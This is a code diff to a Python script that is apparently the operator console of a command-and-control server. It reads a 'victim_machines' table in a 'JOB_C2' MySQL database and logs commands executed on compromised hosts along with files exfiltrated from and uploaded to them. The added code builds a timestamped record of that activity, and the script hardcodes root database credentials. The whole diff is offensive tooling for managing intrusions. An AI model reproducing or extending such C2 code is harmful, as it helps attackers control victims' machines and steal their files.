@@ -4,8 +4,15 @@ import re
 import base64
 import sys
 import json
+import datetime
 import mysql.connector
 from mysql.connector import MySQLConnection, Error
+
+class Result:
+	def __init__(self, epoch_id, command, output):
+		self.epoch_id = epoch_id
+		self.command = command
+		self.output = output
 
 def decode ( input ):
 	command_output = input
@@ -16,16 +23,16 @@ def decode ( input ):
 
 def getoutput( id ):
 
+	Results = []
+
 	#query to check whether or not the id requested appears in the database
-	query = """ SELECT command_output, command_record FROM victim_machines WHERE victim_id =%s """
+	query = """ SELECT command_output, command_record, file_names FROM victim_machines WHERE victim_id =%s """
 	data = (id,)
 
 	#https://www.mysqltutorial.org/python-mysql-update/
 	try:
 		#connect to the mysql database
 		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')
-#		if connection.is_connected():
-#			print('Connected to JOB_C2 database')
 
 		cursor = connection.cursor(buffered=True)
 		cursor.execute(query,data)
@@ -33,22 +40,49 @@ def getoutput( id ):
 #		print(result[0][1])
 
 		if result:
-			print("id found in the database, decoding output and cleaning database...")
 			#get command output, decode it, output it, and set command_output to empty set
 			decoded_output = decode(result[0][0])
 			decoded_record = decode(result[0][1])
+			decoded_filenames = decode(result[0][2])
 
 			record_data = json.loads(decoded_record)
 			output_data = json.loads(decoded_output)
+			filename_data = json.loads(decoded_filenames)
 
 			newfilename = id + ".txt"
 			file = open(newfilename, "a")
 
 			print("command output written to file named %s.txt" % (id,))
-			for key1, value1 in output_data["exec_commands"].items():
-				for key2, value2 in record_data["exec_commands"].items():
+
+			#append all entries for traditional commands
+			for key1, value1 in record_data["commands"].items():
+				for key2, value2 in output_data["commands"].items():
 					if key1 == key2:
-						file.write("%s : %s\n" % (value2, value1))
+						output = Result(key2, value1, value2)
+						Results.append(output)
+
+			#append all entries for downloaded files
+			for key1, value1 in record_data["exfiltrate"].items():
+				for key2, value2 in filename_data.items():
+					if key1 == key2:
+						output_string = value1 + " was downloaded from victim machine and stored locally at " + value2
+						output = Result(key2, output_string, "")
+						Results.append(output)
+
+			#append all entries for uploaded files
+			for key1, value1 in record_data["infiltrate"].items():
+				for key2, value2 in filename_data.items():
+					if key1 == key2:
+						output_string = value2 + " was uploaded to victim machine at " + value1
+						output = Result(key2, output_string, "")
+						Results.append(output)
+
+			#sort the results to be in chronological order
+			sorted_list = sorted(Results, key=lambda result: result.epoch_id)
+
+			for entry in sorted_list[1:]:
+				entry.epoch_id = datetime.datetime.fromtimestamp(int(entry.epoch_id))
+				file.write("%s   %s   %s\n" % (entry.epoch_id, entry.command, entry.output))
 
 			file.close()
 #			print(json.dumps(json_data, indent=2))
